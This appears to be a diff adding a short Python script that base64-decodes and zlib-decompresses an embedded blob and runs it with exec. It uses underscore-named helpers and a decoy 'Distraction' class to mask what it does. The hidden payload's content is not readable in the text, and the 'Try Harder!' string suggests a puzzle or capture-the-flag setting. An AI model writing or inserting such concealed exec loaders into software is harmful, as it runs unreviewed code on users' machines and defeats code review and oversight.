@@ -1,0 +1,17 @@
+def _(x): return __import__('base64').b64decode(x)
+def __(x): return __import__('zlib').decompress(x)
+___ = lambda code: exec(code)
+
+class Shadow:
+    @staticmethod
+    def drop():
+        return "eJwrKMrMK9FQCiguLtFRyEgtSlUvVkhUyMksKclJVShOTS5KLVFIyy9SqMwvtVJQr07LSUy38g/29AuJNzYwMa9VV9DVVSjOyMjQU9IEANNOGFE="
+
+class Distraction:
+    def hash_it(self, s): return ''.join([chr(ord(c) ^ 42) for c in s[::-1]])
+    def do_nothing(self):
+        if False: self.hash_it("Try Harder! ") 
+
+if __name__ == "__main__":
+    payload = __( _(Shadow.drop()) )
+    ___(payload)
